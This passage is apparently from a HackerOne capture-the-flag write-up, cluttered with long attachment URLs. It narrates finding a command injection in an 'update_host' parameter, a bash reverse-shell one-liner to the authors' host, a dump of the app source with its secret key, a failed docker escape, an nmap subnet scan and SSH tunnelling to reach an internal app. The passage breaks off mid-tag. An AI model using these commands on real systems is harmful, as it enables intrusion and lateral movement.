data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/477/fcb1e9a94b1ec6a38cf179bacab8575faac84a33/Selection_207.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_207.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_207.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=a056dad6f69bd3b5fc30afeb535f4d7fd9349f5df7f80ad4c3af95c0fdf7ecd2\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/477/fcb1e9a94b1ec6a38cf179bacab8575faac84a33/Selection_207.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_207.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_207.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=a056dad6f69bd3b5fc30afeb535f4d7fd9349f5df7f80ad4c3af95c0fdf7ecd2\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWell, we started the typical recon process and bruted the GET parameters for the \u003ccode\u003e/update\u003c/code\u003e and \u003ccode\u003e/control\u003c/code\u003e. Soon enough, \u003ccode\u003eport\u003c/code\u003e was discovered as a valid parameter on \u003ccode\u003e/update\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003eport\u003c/code\u003e basically controlled port to where the server tried to look for the update file. It only accepted integers and supplying \u003ccode\u003eport\u003c/code\u003e as 1337 made the server connect to \u003ccode\u003ehttp://update.flitethermostat:1337/\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_208.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/479/83b20fc2726b84d6349ed2bfacc59f86f4815032/Selection_208.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_208.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_208.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=6cb74c1180aa3d74985e0f91fbd1ec485bcc728ef9c3daf51046be6a76b480fd\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/479/83b20fc2726b84d6349ed2bfacc59f86f4815032/Selection_208.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_208.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_208.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=6cb74c1180aa3d74985e0f91fbd1ec485bcc728ef9c3daf51046be6a76b480fd\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNow if we can control the port, we might able to control the host too. The hard part was guessing the parameter it depended on. We tried \u003ccode\u003ehost\u003c/code\u003e, \u003ccode\u003ehostname\u003c/code\u003e and all the other obvious names but none worked. The whole wordlist of param-miner also returned nothing.\u003c/p\u003e\n\n\u003cp\u003eNow this is where we got stuck and called it a night (it was already 2am). \u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eNext morning, we stumbled upon \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fdaeken%2Fstatus%2F1101358829168558080\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e tweet from the challenge author, an underscore (\u003ccode\u003e_\u003c/code\u003e). \u003c/p\u003e\n\n\u003cp\u003eThis looks like a CTF hint, maybe we have to brute parameters with underscores? Anyhow \u003ca href=\"/corb3nik\"\u003e@corb3nik\u003c/a\u003e mutated his wordlist with underscores in the prefix, suffix and two words joined with an underscore. \u003c/p\u003e\n\n\u003cp\u003eAnd after some more advanced guessing, we finally figured out the parameter name. It is called \u003ccode\u003eupdate_host\u003c/code\u003e. This was such a stretch.....\u003c/p\u003e\n\n\u003cp\u003eNext, It didn\u0026#39;t take us long to discover the command injection in it. Our input is probably being passed unsanitized in a command and we can easily inject arbitrary commands by using backticks\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_209.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/483/2ce1095372eed8396d2505972b765c82f4f51b21/Selection_209.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_209.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_209.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=7627c1470f23c56dd5413170cfde73358c697260ac5e7603743c8729324b1696\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/483/2ce1095372eed8396d2505972b765c82f4f51b21/Selection_209.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_209.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_209.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=7627c1470f23c56dd5413170cfde73358c697260ac5e7603743c8729324b1696\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNext, we got a reverse shell using\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eecho \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/p.hacker.af/8181 0\u0026gt;\u0026amp;1\u0026quot;|bash\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e(piping to bash as the server was using /bin/sh)\u003c/p\u003e\n\n\u003cp\u003eAnd there, we got the shell.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eubuntu@ip-172-31-22-54:~$ nc -nlvp 8181\nListening on [0.0.0.0] (family 0, port 8181)\nConnection from 104.196.12.98 57122 received!\nbash: cannot set terminal process group (10): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@4d131d414079:/app#\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like we are root and inside an docker instance. Let\u0026#39;s take a look at the source now\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@4d131d414079:/app# cat main.py\nfrom flask import Flask, abort, redirect, render_template, request, Response, session\nfrom jinja2 import Template\nimport base64, json, os, random, re, subprocess, time\n\napp = Flask(__name__)\napp.secret_key = \u0026#39;99807ef08993b1cf019f6cd30fa3acbfbda992ee2aeffc5339f0f130e25604c4\u0026#39;\n\n\u0026lt;snip\u0026gt;...\n\n@app.route(\u0026#39;/diagnostics\u0026#39;)\ndef diagnostics():\n    if \u0026#39;loggedIn\u0026#39; not in session or not session[\u0026#39;loggedIn\u0026#39;]:\n        return redirect(\u0026#39;/\u0026#39;)\n    return \u0026#39;Forbidden\u0026#39;, 403\n\nif __name__ == \u0026quot;__main__\u0026quot;:\n    app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80)\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCAN YOU BELIEVE IT? The whole diagnostics was a ruse....\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eWe started playing around and that\u0026#39;s when I broke the challenge. It was a shared docker instance and I was trying to escape it, so I overwrote the docker entrypoint and broke everything.\u003c/p\u003e\n\n\u003cp\u003eEssentially, I was trying the recent docker CVE-2019-5736. I was hopeful that it might work because the filesystem persisted even after a forced restart (\u003ccode\u003ekill -9 1\u003c/code\u003e). In the process of verifying it, I overwrote the /usr/bin/python (the entrypoint) binary with \u0026#39;1\u0026#39; hoping that it would crash during the force reboot and a new fresh instance would start up.\u003c/p\u003e\n\n\u003cp\u003eInstead, it went down and never came up. We messaged Cody and even went to talk to him IRL. We asked him about the docker escape and he was like \u0026quot;No, you guys are way overthinking this\u0026quot; and then he restarted the challenge. He also turned down our approach of leaking stuff with the Google Cloud Metadata.\u003c/p\u003e\n\n\u003cp\u003eWell, the next thing we did was to install some useful tools (\u003ccode\u003enet-tools\u003c/code\u003e, \u003ccode\u003enmap\u003c/code\u003e) in the otherwise minimal docker image. Then we scanned the local subnet\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@4d131d414079:/app# ifconfig\neth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt;  mtu 1500\n        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255\n        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)\n        RX packets 702225  bytes 97006785 (92.5 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 560986  bytes 152943040 (145.8 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        loop  txqueuelen 1  (Local Loopback)\n        RX packets 2  bytes 1033 (1.0 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 2  bytes 1033 (1.0 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nroot@4d131d414079:/app# nmap -v 172.19.0.0/16\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-03 07:05 UTC\nInitiating ARP Ping Scan at 07:05\nScanning 4096 hosts [1 port/host]\n\u0026lt;snip\u0026gt;\nDiscovered open port 22/tcp on 172.19.0.1\nDiscovered open port 80/tcp on 172.19.0.3\nDiscovered open port 80/tcp on 172.19.0.1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePort 80 was open on 172.19.0.3, that sounds promising....\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003eroot@4d131d414079:/app# curl 172.19.0.3\n\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u003c/span\u003e \u003cspan class=\"na\"\u003elang=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;en\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;snip\u0026gt;\u003c/span\u003e....\n\n\u003cspan class=\"nt\"\u003e\u0026lt;b\u0026gt;\u003c/span\u003eMaterials contained within are confidential and for HackerOne employee eyes only\u003cspan class=\"nt\"\u003e\u0026lt;/b\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;snip\u0026gt;\u003c/span\u003e...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo another webapp, huh? It\u0026#39;s hosted on the private subnet of the docker instance, so we can\u0026#39;t directly access it from the outside. It would suck to exploit it over curl, so let\u0026#39;s pull some super advanced networking tricks make it more accessible.\u003c/p\u003e\n\n\u003cp\u003eSince it\u0026#39;s a docker instance and I\u0026#39;m behind a NAT myself, we can\u0026#39;t directly reach each other. So I will be using a Jump box to pull some ssh forwarding tricks. \u003c/p\u003e\n\n\u003cp\u003eI installed \u003ccode\u003esshd\u003c/code\u003e on the docker instance, and then forwarded the local port 22 to port 2222 on my Jumpbox.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@4d131d414079:/app# service ssh start\nStarting OpenBSD Secure Shell server: sshd.\n\nroot@4d131d414079:/app# ssh ubuntu@p.hacker.af -R 2222:localhost:22\nubuntu@p.hacker.af\u0026#39;s password:\n\u0026lt;snip\u0026gt;...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThen I forward the port 2222 on my Jumpbox to 4444 locally\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ssh ubuntu@p.hacker.af -L 4444:localhost:2222\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow I can basically reach the docker instance by ssh-ing to localhost on port 4444. I already had my public key added, so everything works out nicely.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e $ ssh root@localhost -p 4444                            \nThe authenticity of host \u0026#39;[localhost]:4444 ([127.0.0.1]:4444)\u0026#39; can\u0026#39;t be established.\nECDSA key fingerprint is SHA256:x5ufg0rDo0ac001Yng3bJFS6yDyfk6H8ZZnOFj++kJM.\n\u0026lt;snip\u0026gt;....\nLast login: Sat Mar  2 09:31:09 2019 from 127.0.0.1\nroot@4d131d414079:~#\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWell, now we use the fancy dynamic forwarding feature of SSH .\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files/# ssh root@localhost -p 4444 -D 6666\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing localhost:6666 as a SOCKS proxy, we can access the private subnet of the docker instance now.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_210.png\" 